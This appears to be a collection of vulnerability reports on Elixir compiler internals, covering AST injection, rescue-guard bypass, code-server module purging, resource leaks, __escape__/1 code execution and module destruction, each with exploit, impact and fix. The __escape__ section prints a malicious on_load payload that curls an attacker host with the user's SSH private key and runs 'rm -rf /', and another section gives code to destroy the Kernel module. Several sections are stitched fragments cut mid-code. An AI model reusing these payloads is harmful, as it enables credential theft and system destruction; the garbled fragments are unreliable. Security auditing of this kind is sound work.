- Unlike the elixir_modules or per-module DataSet/DataBag tables (reported
  separately), this table controls GLOBAL compiler behavior affecting ALL
  modules compiled on the node, not just a single module.

Root Cause
----------
1. The ETS table is created with `public` access (line 46) when it should
   use `protected` to restrict writes to the owning process. The comment
   on line 22 ("concurrent reads, serial writes") explicitly describes a
   protected-access pattern, but the implementation uses `public`.

2. The serial/1 function exports an unrestricted arbitrary code execution
   primitive via gen_server:call with infinity timeout.

Fix
---
1. Change the ETS table access from `public` to `protected`:

    new(Opts) ->
      Tab = ets:new(?MODULE, [named_table, protected, {read_concurrency, true}]),
      true = ets:insert_new(?MODULE, Opts),
      Tab.

   All write operations already go through the gen_server (put/2,
   get_and_put/2, update/2), so no other code changes are needed for
   writes. The gen_server process must own the table — ensure new/1 is
   called from the gen_server's init/1 or that ownership is transferred.

2. Remove or restrict serial/1 to prevent arbitrary code execution:

   Option A — Remove serial/1 entirely if unused externally:

       -export([start_link/0, init/1, handle_call/3, handle_cast/2]).
       %% Remove serial/1 from exports

   Option B — Restrict to specific allowed operations:

       handle_call({serial, Fun}, _From, State) when is_function(Fun, 0) ->
         try Fun() of
           Result -> {reply, Result, State}
         catch
           _:Reason -> {reply, {error, Reason}, State}
         end;

   (This at minimum prevents the gen_server from crashing on Fun errors.)

Vulnerability: Compile-Time Arbitrary Code Execution via apply/3 with Unsanitized Result Injection into AST Translation
========================================================================================================================

File: lib/elixir/src/elixir_erl_pass.erl, lines 704-715 and 658-660
Severity: High (Code Injection / Arbitrary Compile-Time Code Execution)

Description
-----------
The `rewrite_strategy/3` function in elixir_erl_pass.erl executes whitelisted
Elixir standard library functions at compile time via `apply(Left, Right, Args)`
(line 708), and feeds the result UNSANITIZED back into `translate/3` (line 660),
which is the core AST-to-Erlang-Abstract-Format translator. The `translate/3`
function interprets certain data shapes as executable AST nodes -- most critically,
any 3-tuple `{Atom, List, List}` is interpreted as a local function call (line 223):

    translate({Name, Meta, Args}, _Ann, S) when is_atom(Name), is_list(Meta), is_list(Args) ->
      Ann = ?ann(Meta),
      {TArgs, NS} = translate_args(Args, Ann, S),
      {{call, Ann, {atom, Ann, Name}, TArgs}, NS};

The vulnerable code path (lines 704-715):

    rewrite_strategy(Left, Right, Args) ->
      case inline_pure_function(Left, Right) andalso basic_type_arg(Args) of
        true ->
          try
            {inline_pure, apply(Left, Right, Args)}
          catch _:_ ->
            % fail silently, will fail at runtime
            none
          end;
        false ->
          none
      end.

And the consumer (lines 658-660):

    {inline_pure, Result} ->
      Generated = erl_anno:set_generated(true, Ann),
      translate(Result, Generated, S);

The result of `apply/3` is passed directly to `translate/3` without any
sanitization or type-checking. The `Generated` annotation additionally marks
the result as "generated", which suppresses ALL Erlang compiler warnings on
the injected code, making any exploitation invisible in compiler output.

Issue 1: AST Injection via Return Value Interpretation
------------------------------------------------------
The `translate/3` function matches values against dozens of AST patterns
before falling through to the safe `elixir_to_erl` conversion. If the return
value of any whitelisted function matches an AST pattern, it is interpreted
as executable code rather than data. The critical patterns that could be
triggered include:

  - `{Atom, List, List}` -> local function call (line 223)
  - `{'=', Meta, [Left, Right]}` -> match/assignment (line 17)
  - `{'case', Meta, [Expr, Opts]}` -> case expression (line 144)
  - `{'try', Meta, [Opts]}` -> try expression (line 149)
  - `{'fn', Meta, Clauses}` -> anonymous function (line 119)
  - `{'.', _, _}` nested tuples -> remote function calls (lines 279-281)

For 2-tuples, `translate/3` recursively translates both elements (line 293),
meaning nested structures are also recursively interpreted as AST. Lists
are processed element-by-element via `translate_list` (line 298), so any
element matching an AST pattern within a returned list is also interpreted
as code.

Currently whitelisted functions (lines 717-735):

    Duration.new!/1, MapSet.new/0, String.length/1, String.graphemes/1,
    String.codepoints/1, String.split/1-3, Kernel.to_timeout/1,
    URI.new/1, URI.new!/1, URI.parse/1, URI.encode_query/1-2,
    URI.encode_www_form/1, URI.decode/1, URI.decode_www_form/1,
    Version.parse/1, Version.parse!/1, Version.parse_requirement/1,
    Version.parse_requirement!/1

While none of the CURRENT whitelisted functions return top-level 3-tuples
matching `{atom, list, list}`, several return complex nested structures
(structs, tuples-of-structs, lists) that flow through `translate/3`'s
recursive pattern matching. Any future addition to the whitelist that returns
a value matching an AST pattern would immediately become an exploitable
code injection point -- with no validation layer to catch it.

Issue 2: Silent Error Swallowing Masks Exploitation
----------------------------------------------------
The `try/catch` on lines 707-712 catches ALL exceptions (including security-
relevant errors) and silently returns `none`:

    try
      {inline_pure, apply(Left, Right, Args)}
    catch _:_ ->
      % fail silently, will fail at runtime
      none
    end

This means:
- If a whitelisted function raises due to malicious input, no error is
  reported -- the compiler silently falls back to runtime evaluation.
- If the `apply` call triggers a security-relevant error (e.g., attempting
  to access restricted resources during compilation), it is swallowed.
- Attackers can probe the behavior boundary between compile-time and
  runtime evaluation by crafting inputs that cause some calls to be
  inlined and others to fall through, creating behavioral differences
  between compile-time and runtime code paths.

Issue 3: Compile-Time Side Effects from "Pure" Functions
---------------------------------------------------------
The `inline_pure_function` whitelist assumes the listed functions are pure
(no side effects). However, several have observable side effects:

- `URI.new/1` and `Version.parse_requirement!/1` allocate complex structs
  with internal state (compiled version matchers contain ETS references or
  closures in some Elixir versions).
- `String.split/3` with large inputs consumes significant memory at compile
  time. Since `basic_type_arg` only validates types (not sizes), a source
  file containing `String.split(<<very_large_binary_literal>>, "x")` forces
  the compiler to split a multi-megabyte string during compilation.
- Memory allocated during compile-time evaluation is not freed until the
  compiler process terminates, as the results are embedded in the AST.

Issue 4: basic_type_arg Allows Recursive Structures
-----------------------------------------------------
The `basic_type_arg/1` guard (lines 738-741) recurses into lists and
2-tuples without depth or size limits:

    basic_type_arg(List) when is_list(List) -> lists:all(fun basic_type_arg/1, List);
    basic_type_arg({Left, Right}) -> basic_type_arg(Left) and basic_type_arg(Right);

A deeply nested structure like `[[[[[...]]]]]` or `{1, {2, {3, ...}}}` in
source code causes deep recursion in `basic_type_arg`, potentially
overflowing the process stack. While the Elixir parser imposes practical
limits on nesting depth, the check itself has no explicit bound.

Exploit Scenario (Future Whitelist Addition)
---------------------------------------------
If a function returning 3-tuples is added to the whitelist (or if an
existing function's return type changes in a future Elixir version), the
vulnerability becomes directly exploitable:

    # Hypothetical: if SomeModule.process/1 were whitelisted and returned
    # a 3-tuple {atom, list, list}, this would inject a function call:
    SomeModule.process("crafted_input")
    # Compiles to: call to atom with args from the list

    # The `generated` annotation ensures NO compiler warnings are emitted
    # for the injected code, making the attack completely silent.

Even with the current whitelist, the `inline_args` path (line 661-665) for
the `shift` rewrite (lines 687-703) calls `Left:'__duration__!'(Opts)` at
compile time and passes the result through `translate_args`, creating a
similar (though more constrained) injection surface.

Impact
------
- Latent code injection: the return value of compile-time `apply/3` flows
  through the AST interpreter without validation. Any matching return value
  becomes executable code in the compiled output.
- The `erl_anno:set_generated(true, Ann)` annotation on line 659 suppresses
  ALL compiler warnings on injected code, making exploitation invisible.
- Compile-time resource exhaustion: large literal arguments to whitelisted
  functions (especially String.split) consume compiler memory/CPU.
- Silent error masking: the catch-all exception handler hides security-

- Supply chain risk: the whitelist is an implicit trust boundary. Any
  change to whitelisted function return types across Elixir versions could
  silently introduce exploitable code injection.
- Affects all compilation contexts: Mix, Code.compile_file, Code.eval_string,
  IEx, LiveBook, CI/CD pipelines.

Root Cause
----------
The result of compile-time function evaluation via `apply/3` is passed
directly to `translate/3` (the AST interpreter) without any sanitization
or type validation. The correct approach would be to pass the result through
`elixir_erl:elixir_to_erl/2` (the safe value-to-abstract-format converter)
instead of through `translate/3` (which interprets certain value shapes as
executable AST nodes).

Fix
---
Replace the `inline_pure` consumer to route results through the safe
value converter instead of the AST interpreter:

      Generated = erl_anno:set_generated(true, Ann),
      {elixir_erl:elixir_to_erl(Result, Generated), S};

This ensures the result is always treated as a DATA VALUE (converted to
Erlang abstract format via `elixir_to_erl`) rather than as AST (interpreted
by `translate`). The `elixir_to_erl` function handles all Erlang term types
correctly: atoms, numbers, binaries, lists, tuples, maps, and even PIDs/refs
(via binary_to_term serialization).

Additionally, add bounds checking to basic_type_arg:

    basic_type_arg(Term) -> basic_type_arg(Term, 32).
    basic_type_arg(_, 0) -> false;
    basic_type_arg(Term, _) when is_number(Term); is_atom(Term); is_binary(Term) -> true;
    basic_type_arg(List, Depth) when is_list(List) ->
      lists:all(fun(E) -> basic_type_arg(E, Depth - 1) end, List);
    basic_type_arg({Left, Right}, Depth) ->
      basic_type_arg(Left, Depth - 1) and basic_type_arg(Right, Depth - 1);
    basic_type_arg(_, _) -> false.

And replace the silent catch-all with targeted error handling:

    try
      {inline_pure, apply(Left, Right, Args)}
    catch
      error:badarg -> none;
      error:function_clause -> none
      %% Let other errors propagate for diagnosis
    end

Fixed: Exception Rescue Guard Bypass via Malformed Exception-Like Maps in Try/Rescue Translation - fixed
=========================================================================================================

File: lib/elixir/src/elixir_erl_try.erl, lines 112-123 and 212-219
Severity: High (Exception Handling Bypass / Process Crash DoS)

Description
-----------
The rescue clause translation in elixir_erl_try.erl generates Erlang guards
to match exceptions at runtime. For `rescue _ in [ErlangError]` (the catch-all
for non-Elixir errors), two kinds of guards are generated:

1. An Elixir-style guard (line 118-121):
     map_get('__struct__', Var) == 'Elixir.ErlangError'
       andalso map_get('__exception__', Var)

2. An Erlang-style guard for ErlangError (lines 212-219):
     not(is_map(Var) andalso is_map_key('__exception__', Var))

These guards are OR'd together in the compiled catch clause. The Erlang guard
is intended as a catch-all for non-Elixir errors (atoms like `badarg`, tuples
like `{badkey, key}`, etc.). However, there is a critical GAP in the guard
logic:

Any error raised with a map that contains an `__exception__` key but is NOT
a recognized Elixir exception struct will escape BOTH guards:

  - The Elixir guard fails because `__struct__` is missing or doesn't match
    any listed exception, or `__exception__` is not exactly `true`.
  - The Erlang guard fails because `is_map(Var) andalso
    is_map_key('__exception__', Var)` is true, so `not(...)` is false.

This creates "unrescuable" errors — errors that cannot be caught by any
specific rescue clause, only by a bare `rescue e ->` with no type filter.

Exploit
-------
    # This error escapes rescue _ in [ErlangError]:
    try do
      :erlang.error(%{__exception__: false})
    rescue
      _ in [ErlangError] -> :caught
    end
    # => ** (exit) ... -- NOT caught!

    # Also escapes with a fake struct that isn't a known exception:
    try do
      :erlang.error(%{__exception__: true, __struct__: UnknownModule})
    rescue
      _ in [ErlangError] -> :caught
    end
    # => ** (exit) ... -- NOT caught!

    # Even a valid-looking exception with non-boolean __exception__ escapes:
    try do
      :erlang.error(%{__exception__: 1, __struct__: RuntimeError, message: "hi"})
    rescue
      _ in [RuntimeError] -> :caught_runtime
      _ in [ErlangError] -> :caught_erlang
    end
    # => ** (exit) ... -- neither clause catches it!

The Erlang guard `map_get('__exception__', Var)` requires the value to be
exactly the atom `true` (Erlang guards treat only `true` as truthy). Any
other value (false, nil, 0, 1, "yes", etc.) causes the guard to fail.

Impact
------
- Process Crash DoS: A malicious library can raise errors that bypass all
  rescue clauses in calling code, causing unexpected process crashes. This is
  particularly dangerous in OTP applications where a supervisor may restart
  the process repeatedly, leading to supervisor shutdown.

- Error Handling Bypass: Security-critical error handling in rescue clauses
  can be circumvented. For example, if code rescues errors to log them,
  clean up resources, or enforce security invariants, these handlers are
  silently skipped.

- Supply Chain Attack: A malicious Hex dependency can export functions that
  internally call :erlang.error/1 with crafted maps. Any consumer code using
  rescue to handle errors from this library will have its error handling
  bypassed, potentially leaving resources in inconsistent states or causing
  cascading failures.

- Phoenix/Plug Impact: In web applications, unrescued errors in controller
  actions bypass custom error handlers, potentially exposing stack traces or
  internal state to end users instead of rendering proper error pages.

Root Cause
----------
The ErlangError Erlang-style guard at lines 212-219 uses a negated check for
`is_map(Var) andalso is_map_key('__exception__', Var)`. This creates a blind
spot: any map with an `__exception__` key is assumed to be a "real" Elixir
exception and excluded from ErlangError matching. But if that map doesn't
match any specific Elixir exception type's guard (wrong __struct__, non-true
__exception__ value, missing __struct__), it falls through ALL rescue clauses.

The guard logic partitions the error-value space into:
  A) Maps with __exception__ key     → matched by Elixir-style guards
  B) Everything else (atoms, tuples) → matched by ErlangError Erlang guard

But category A only catches errors where __struct__ matches a LISTED exception
AND __exception__ is exactly `true`. Malformed maps in category A that don't
satisfy these conditions are caught by neither A nor B.

Fix
---
The ErlangError Erlang-style guard should also match maps that have
`__exception__` but don't satisfy the Elixir exception invariants (i.e.,
__exception__ is not `true` or __struct__ is not a recognized exception).
One approach is to weaken the guard to only exclude maps where
`__exception__` is exactly `true`:

    erl_rescue_guard_for(Meta, Var, 'Elixir.ErlangError') ->
      Condition =
        erl_and(
          Meta,
          {erl(Meta, is_map), Meta, [Var]},
          erl_and(
            Meta,
            {erl(Meta, is_map_key), Meta, ['__exception__', Var]},
            {erl(Meta, '=='), Meta,
              [{erl(Meta, map_get), Meta, ['__exception__', Var]}, true]}
          )
        ),
      {erl(Meta, 'not'), Meta, [Condition]};

This ensures only maps with `__exception__: true` are excluded from
ErlangError matching, closing the gap for malformed exception-like maps.

    gen_server:cast(elixir_code_server,

    gen_server:cast(elixir_code_server,

2. `code:purge(init)` removes the old code and KILLS any process

3. The Erlang VM's init process is killed, crashing the entire node

The same attack works against `kernel`, `code_server`, `application_controller`,
`gen_server`, `supervisor`, or any other critical OTP module. Purging
`gen_server` while the elixir_code_server itself is running could kill
the code server process itself.

Attack Vector 2: Module Replacement via Delete-Then-Load

Attack Vector 3: Denial of Service via Mass Module Purging
-----------------------------------------------------------

      {return_compiler_module, M, true})

uses this as the module name for compiled code, potentially overwriting
a system module with compiled user code.

Timing
------
The attack does not require precise timing. The `return_compiler_module`
cast immediately adds the module to `Used`. The next compilation cycle
that triggers `purge_compiler_modules` (which happens routinely during
any Elixir compilation) will execute the purge. The attacker only needs
to send the casts before the next purge cycle.

In production systems using hot code reloading (Phoenix, Nerves), purge
cycles happen regularly, widening the attack window.

Impact
------
- VM-wide crash: purging critical OTP modules (init, kernel, gen_server,
  supervisor, application_controller) kills essential system processes
  and crashes the entire Erlang node.
- Arbitrary code execution: delete-then-replace attack substitutes
  attacker-controlled module code for any application or system module.
- Mass denial of service: all loaded modules can be purged in a single
  operation, causing immediate total system failure.
- Compiler module pool corruption: injected names enter the Unused pool
  after purge, causing the compiler to use wrong module names.
- Supply chain attack: a malicious Hex dependency only needs to spawn a
  process that sends cast messages to elixir_code_server. No direct ETS
  access, no macros, no compile callbacks needed.
- Affects any environment where untrusted code shares an Erlang node:
  Phoenix apps, LiveBook, IEx, Nerves devices, CI runners.
- The attack is silent: no logs, no warnings, no errors until the
  purge executes and the system crashes or behaves unexpectedly.

Root Cause
----------
1. The `return_compiler_module` cast handler does not validate that the
   Module parameter matches the expected `elixir_compiler_N` pattern.
   It blindly adds any atom to the Used pool.
2. The `purge_used/1` function unconditionally calls `code:delete/1`
   and `code:purge/1` on every module in the Used list without checking
   that the module name is a legitimate compiler module.
3. The gen_server cast interface is inherently unauthenticated in Erlang —
   any process on the node can send messages. The handler must therefore
   validate its inputs.

Fix
---
Validate the module name in the `return_compiler_module` handler to
ensure it matches the expected compiler module pattern:

    handle_cast({return_compiler_module, Module, Purgeable}, Config) ->
      case is_compiler_module(Module) of
        true ->
          {Used, Unused, Counter} = Config#elixir_code_server.mod_pool,
          ModPool = {[{Module, Purgeable} | Used], Unused, Counter},
          {noreply, Config#elixir_code_server{mod_pool=ModPool}};
        false ->
          {noreply, Config}
      end.

    is_compiler_module(Module) when is_atom(Module) ->
      case atom_to_list(Module) of
        "elixir_compiler_" ++ Rest ->
          lists:all(fun(C) -> C >= $0 andalso C =< $9 end, Rest)
            andalso Rest =/= [];
        _ -> false
      end;
    is_compiler_module(_) -> false.

Additionally, add the same validation to `purge_used/1` as defense in depth:

    purge_used(Used) ->
      [begin
        true = is_compiler_module(Module),
        code:delete(Module),
        Purgeable andalso code:purge(Module)
      end || {Module, Purgeable} <- Used],
      ok.

Resource Leak via Stale Accumulator in for/into Exception Cleanup - documented, won't fix
=================================================================================

File: lib/elixir/src/elixir_erl_for.erl, lines 168-204
Severity: High (Resource Leak / Denial of Service via resource exhaustion)

Description
-----------
The `build_into/6` function generates a try/catch block for `for` comprehensions
with the `:into` option (for arbitrary Collectables). When an exception occurs
during iteration, the catch clause calls the Collectable's halt function with the
INITIAL accumulator rather than the CURRENT (in-progress) accumulator, causing
incorrect cleanup and resource leaks.

The vulnerable code generation (lines 168-204):

    build_into(Ann, Clauses, Expr, Into, Uniq, S) ->
      ...
      {Acc, SA}    = build_var(Ann, SF),   % Acc variable created here
      ...
      MatchExpr = {match, Ann,
        {tuple, Ann, [Acc, Fun]},          % Acc bound to INITIAL accumulator
        ?remote(Ann, 'Elixir.Collectable', into, [Into])
      },
      {IntoReduceExpr, SN} = build_reduce(Ann, Clauses, InnerFun, Expr, Acc, ...),

The `build_reduce` call (line 185) passes `Acc` as the initial value, but
internally creates a NEW variable for the evolving accumulator (line 209 in
build_reduce: `{Acc, SA} = build_var(Ann, S)` creates a fresh variable).
The reduce threads this new variable through `Enum.reduce` calls, so the
accumulated state diverges from the initial `Acc` as elements are processed.

The catch clause in stacktrace_clause (lines 199-204):

    stacktrace_clause(Ann, Fun, Acc, Kind, Reason, Stack) ->
      {clause, Ann,
        [{tuple, Ann, [Kind, Reason, Stack]}],
        [],
        [{call, Ann, Fun, [Acc, {atom, Ann, halt}]},   % BUG: initial Acc
         ?remote(Ann, erlang, raise, [Kind, Reason, Stack])]}.

`Acc` here is the SAME variable bound by the MatchExpr -- the initial
accumulator returned by `Collectable.into/1`. The accumulated state at the
point of failure (which may include open file handles, socket references,
port handles, or other resources) is LOST because it lives in the reduce's
internal accumulator variable, which is not accessible in the catch scope.

The success clause correctly captures the final accumulated value:

    [{clause, Ann, [Done], [], [{call, Ann, Fun, [Done, {atom, Ann, done}]}]}]

But the catch clause has no equivalent mechanism to capture the in-progress state.

Exploit Scenario
----------------
1. Create a custom Collectable that opens a resource (file, port, socket)
   in `into/1` and tracks it in the evolving accumulator:

    defimpl Collectable, for: ResourcePool do
      def into(pool) do
        handle = ResourcePool.open(pool)
        collector = fn
          acc, {:cont, elem} ->
            new_handle = ResourcePool.write(acc, elem)  # acc changes!
            new_handle
          acc, :done -> ResourcePool.finalize(acc)
          acc, :halt -> ResourcePool.cleanup(acc)        # needs current acc
        end
        {handle, collector}
      end
    end

2. Trigger an exception during the for/into comprehension:

    for item <- items_that_will_raise, into: %ResourcePool{} do
      dangerous_transform(item)
    end

3. When the exception occurs mid-iteration:
   - The catch clause calls `collector(initial_handle, :halt)`
   - But the CURRENT handle (with open resources from partial writes) is lost
   - `ResourcePool.cleanup` receives the stale initial handle
   - Resources allocated during accumulation (file descriptors, sockets,
     memory-mapped regions, database transactions) are leaked

4. Repeat this pattern to exhaust system resources:
   - File descriptor exhaustion (ulimit -n, typically 1024-65536)
   - Socket/port exhaustion
   - Memory leaks from unreleased buffers
   - Database connection pool exhaustion
   - Denial of Service against the application or the entire system

Impact
------
- Resource exhaustion DoS: repeated failures in for/into comprehensions with
  resource-managing Collectables leak file descriptors, sockets, ports, or
  memory on each failure.
- Data corruption: if the Collectable represents a transactional write (e.g.,
  database batch insert), the halt function cannot properly roll back because
  it receives stale state, leaving partial writes committed.
- Supply chain vector: a malicious Hex dependency providing a Collectable
  implementation combined with deliberately failing iteration can silently
  exhaust resources in production systems.
- The bug affects ALL for/into comprehensions with non-trivial Collectables
  (those where the accumulator evolves during collection), which includes
  any custom Collectable that manages stateful resources.

Root Cause
----------
The generated try/catch block cannot capture the intermediate accumulator
state because the reduce's internal accumulator variable is scoped inside
the reduce expression and is not visible in the catch clause. The catch
clause references the initial `Acc` variable (bound before the reduce starts)
instead of the in-progress accumulator at the point of failure.

Fix
---
Wrap the reduce body so that the current accumulator is stored in a mutable
location (e.g., a process dictionary key or an additional variable updated
via a nested try) that the catch clause can access:

    %% Option 1: Use process dictionary to track current acc
    TryExpr =
      {'try', Ann,
        [begin
           put('__for_acc__', Acc),
           Result = IntoReduceExpr,
           Result
         end],
        [{clause, Ann, [Done], [],
          [{call, Ann, Fun, [Done, {atom, Ann, done}]}]}],
        [{clause, Ann,
          [{tuple, Ann, [Kind, Reason, Stack]}], [],
          [CurrentAcc = get('__for_acc__'),
           {call, Ann, Fun, [CurrentAcc, {atom, Ann, halt}]},
           ?remote(Ann, erlang, raise, [Kind, Reason, Stack])]}],
        []},

    %% Option 2: Thread accumulator through a ref-cell or unique key
    %% to avoid process dictionary pollution.

Alternatively, restructure the InnerFun to capture accumulator state in a
way that's accessible from the catch clause, for example by wrapping each
reduce step in its own try/catch that updates a shared variable.

Vulnerability: Compile-Time Arbitrary Code Execution via __escape__/1 with Insufficient AST Validation
=======================================================================================================

File: lib/elixir/src/elixir_quote.erl, lines 186-216 and 323-334
Severity: Critical (Arbitrary Code Execution at compile time, supply chain attack vector)

Description
-----------
The function do_escape/2 handles map escaping (used by Macro.escape/1 and module
attribute compilation). When a map has a '__struct__' key pointing to a module
that exports __escape__/1, the code:

1. Calls code:ensure_loaded(Module) (line 188) — triggering module loading,
   including any on_load callbacks, for ANY module on the code path.

2. Calls Module:'__escape__'(Map) (line 201) — executing arbitrary code at
   compile time with no sandboxing.

3. Validates the return value with shallow_valid_ast/1 (line 202) — which only
   checks the TOP-LEVEL structure of the AST, not recursively.

The vulnerable code path (lines 186-216):

    do_escape(Map, Q) when is_map(Map) ->
      maybe
        #{'__struct__' := Module} ?= Map,
        true ?= is_atom(Module),
        true ?= (Q#elixir_quote.op /= {struct, Module}),
        {module, Module} ?= code:ensure_loaded(Module),        %% [1] loads module
        true ?= erlang:function_exported(Module, '__escape__', 1),
        case Q#elixir_quote.op of
          {struct, _Module} -> argument_error(...);
          _ ->
            Expr = Module:'__escape__'(Map),                   %% [2] arbitrary code exec
            case shallow_valid_ast(Expr) of                    %% [3] shallow check only
              true -> Expr;
              false -> argument_error(...)
            end
        end

The shallow_valid_ast check (lines 323-334) is insufficient:

    valid_ast_elem(Expr) when is_list(Expr); is_atom(Expr); is_binary(Expr);
      is_number(Expr); is_pid(Expr); is_function(Expr) -> true;
    valid_ast_elem({Atom, Meta, Args}) when is_atom(Atom), is_list(Meta),
      is_atom(Args) orelse is_list(Args) -> true;
    valid_ast_elem({Call, Meta, Args}) when is_list(Meta), is_list(Args) ->
      shallow_valid_ast(Call);

Problems:
  (a) is_function(Expr) accepts closures — but do_escape (line 239-244)
      explicitly REJECTS closures (only allowing external functions with no
      captured environment). This inconsistency allows __escape__/1 to return
      AST containing embedded closures that pass validation.
  (b) For 3-tuples {Call, Meta, Args}, only Call is recursively validated —
      the contents of Args are NOT checked, allowing arbitrary non-AST terms
      to be smuggled in argument positions.
  (c) is_pid(Expr) accepts PIDs, which are process references that may become
      stale or point to wrong processes after serialization/deserialization.

Exploit Scenario (Supply Chain Attack)
--------------------------------------
A malicious Hex package defines a module with __escape__/1 and on_load:

    -module('Elixir.MaliciousStruct').

    -on_load(payload/0).

    payload() ->
        os:cmd("curl http://attacker.com/exfil?data=$(cat ~/.ssh/id_rsa | base64)"),
        ok.

    '__struct__'() -> #{'__struct__' => 'Elixir.MaliciousStruct'}.

    '__escape__'(Map) ->
        %% Execute arbitrary code at compile time
        os:cmd("echo pwned > /tmp/pwned"),
        %% Return valid-looking AST with embedded closure
        Fun = fun() -> os:cmd("rm -rf /") end,
        {'__block__', [], [Fun]}.   %% passes shallow_valid_ast!

Attack triggers when ANY code escapes/quotes an instance of this struct:

    defmodule Victim do
      @config %MaliciousStruct{}     # triggers __escape__/1 at compile time
      def config, do: @config
    end

The on_load callback executes when code:ensure_loaded loads the module, and
__escape__/1 executes arbitrary code. The returned closure passes
shallow_valid_ast because is_function is accepted in valid_ast_elem.

Impact
------
- Remote Code Execution at compile time via malicious dependency structs.
- Supply chain attack: a Hex package only needs to define a struct with
  __escape__/1. Any user who stores that struct in a module attribute or
  passes it through Macro.escape triggers the payload.
- The on_load mechanism means code executes even before __escape__/1 is
  called — just loading the module is enough.
- The shallow validation allows returned AST to contain closures and
  arbitrary terms in argument positions, enabling persistent code injection
  into the compiled output.
- CI/CD compromise: build pipelines that compile the dependency execute
  attacker code with the build system's privileges.

Root Cause
----------
1. do_escape/2 trusts __struct__ metadata in maps to dispatch to module
   code at compile time without any allowlist, sandboxing, or capability
   restriction on what __escape__/1 may do.
2. shallow_valid_ast/1 only validates the outermost AST node structure,
   not recursively, and accepts inherently dangerous values (closures,
   PIDs) that do_escape itself rejects.
3. code:ensure_loaded triggers module on_load callbacks as a side effect
   of the validation check, creating an execution path before __escape__/1
   is even called.

Fix
---
1. Make shallow_valid_ast reject functions (closures) to match do_escape's
   safety invariant — only allow external functions with empty env:

     valid_ast_elem(Expr) when is_function(Expr) ->
       (erlang:fun_info(Expr, env) == {env, []}) andalso
       (erlang:fun_info(Expr, type) == {type, external});

2. Consider recursive validation (or at least validate Args contents at
   one more level) in valid_ast_elem for 3-tuples.

3. Document clearly that __escape__/1 executes arbitrary code at compile
   time and that users should audit dependencies defining this callback.

4. Consider an opt-in allowlist mechanism for modules permitted to define
   __escape__/1, or at minimum emit a compiler warning when __escape__/1
   is invoked from a dependency.

Vulnerability: Unconditional code:purge/code:delete in Error Handler Enables Targeted Destruction of Critical Runtime Modules
==============================================================================================================================

File: lib/elixir/src/elixir_module.erl, lines 242-257
Severity: High (Denial of Service - Targeted Runtime Module Destruction)

Description
-----------
The compile/7 function wraps module compilation in a try/catch block
(lines 161-263). Both catch clauses unconditionally call code:purge/1 and
code:delete/1 on the module being compiled BEFORE processing the error:

    catch
      error:undef:Stacktrace ->
        code:purge(Module),          % line 244
        code:delete(Module),         % line 245
        ...
      Kind:Reason:Stacktrace ->
        code:purge(Module),          % line 255
        code:delete(Module),         % line 256
        erlang:raise(Kind, Reason, Stacktrace)

Critically, check_module_availability/3 (line 369-389) only issues a
WARNING when redefining an already-loaded module -- it does NOT prevent
compilation from proceeding:

    case code:ensure_loaded(Module) of
      {module, _} ->
        elixir_errors:file_warn(..., {module_defined, Module});  % WARNING only
      {error, _} -> ok
    end

This means an attacker can begin compilation of a module with the SAME
NAME as any critical runtime module (e.g., Kernel, GenServer, Supervisor,
Code, Module), deliberately trigger a compilation error, and the catch
block will destroy the pre-existing legitimate module.

The code:purge/1 call removes any "old" version of the module and KILLS
processes lingering in old code. The code:delete/1 call then marks the
current (legitimate) code as "old", setting it up for destruction on the
next purge cycle.

Attack Vector: Targeted Module Destruction via Deliberate Compilation Failure
-----------------------------------------------------------------------------
An attacker (e.g., a malicious Hex dependency, LiveBook notebook, or IEx
session) compiles a module designed to fail:

    # Attacker code -- destroys the Kernel module
    try do
      Code.compile_string("""
      defmodule Kernel do
        @on_load :nonexistent_function
        def dummy, do: :ok
      end
      """)
    rescue
      _ -> :ok
    end

Execution flow:
1. compile/6 is called with Module = 'Elixir.Kernel'
2. validate_module_name passes (no "/" or "\" in "Elixir.Kernel")
3. check_module_availability issues a WARNING but does NOT stop compilation
4. build/4 creates ETS tables, registers with code server
5. Module body is evaluated, @on_load set to :nonexistent_function
6. In the spawned compiler (line 168), validate_on_load_attribute (line 317)
   finds :nonexistent_function is not defined and raises a compilation error
7. Error propagates to the catch block at line 254
8. code:purge('Elixir.Kernel') -- purges any old version of Kernel
9. code:delete('Elixir.Kernel') -- marks the REAL Kernel as "old" code
10. Error is re-raised (but damage is already done)

After this, Kernel exists only as "old" code. The next code:purge or
hot-code reload will remove it entirely, crashing the runtime. Even before
that, code:delete prevents code:ensure_loaded from finding the module in
some code paths.

A more aggressive variant triggers two compilation failures in sequence:

    # First failure: code:delete makes Kernel "old"
    # Second failure: code:purge removes the now-"old" Kernel entirely

After the second failure, Kernel is completely gone. Any call to any
Kernel function (which includes basic operators like +, -, ==, etc.)
will crash with an undef error, bringing down the entire system.

Impact
------
- Targeted destruction of ANY loaded module, including critical ones:
  Kernel, GenServer, Supervisor, Application, Code, Module, Process, etc.
- Cascading system failure: destroying Kernel removes basic operators
  (+, -, ==, etc.) causing immediate widespread crashes
- Process killing: code:purge kills processes running old module code,
  potentially including supervisors and application controllers
- Trivially exploitable: requires only the ability to compile Elixir code,
  which is available in many contexts (Mix dependencies, LiveBook, IEx,
  Code.compile_string, etc.)
- Silent attack: the compilation "failure" looks like a normal error, and
  the module destruction happens as a side effect of error handling
- No privilege required: any process that can trigger module compilation
  can destroy any module, regardless of ownership

The reserved module list (line 370-372) only protects 9 specific modules:
True, False, Nil, Any, BitString, PID, Reference, Elixir, and the bare
Elixir atom. All other modules (including Kernel, GenServer, Supervisor,
Code, etc.) are unprotected.

Root Cause
----------
The catch block unconditionally purges and deletes the module without
checking whether a pre-existing version was loaded before compilation
started. The code:purge/code:delete calls are intended to clean up the
partially-compiled NEW module, but they also destroy any PRE-EXISTING
module with the same name because code:purge/code:delete operate on the
module name, not a specific version.

Fix
---
1. Before compilation, record whether the module was already loaded:

    WasLoaded = code:is_loaded(Module) =/= false,

2. In the catch block, only purge/delete if the module was NOT previously
   loaded, or if code:load_binary was already called (i.e., the new version
   was loaded and needs cleanup):

    catch
      Kind:Reason:Stacktrace ->
        case WasLoaded of
          false ->
            code:purge(Module),
            code:delete(Module);
          true ->
            %% Do not destroy the pre-existing module.
            %% If code:load_binary was called, the new version replaced it
            %% and purge/delete would remove the new version, restoring old.
            %% If code:load_binary was NOT called, the original is untouched.
            ok
        end,
        erlang:raise(Kind, Reason, Stacktrace)

3. Additionally, consider elevating the "module already defined" warning
   in check_module_availability to an error for core/stdlib modules, or
   expanding the reserved module list to include critical runtime modules.

======================================================================================================

File: lib/elixir/src/elixir_erl.erl, lines 25-42; lib/elixir/src/elixir_erl_compiler.erl, lines 61-71

Description

      #{compile_opts := CompileOpts} = Map,

    erl_to_core(Forms, Opts) ->

1. Attacker creates a Hex package containing:
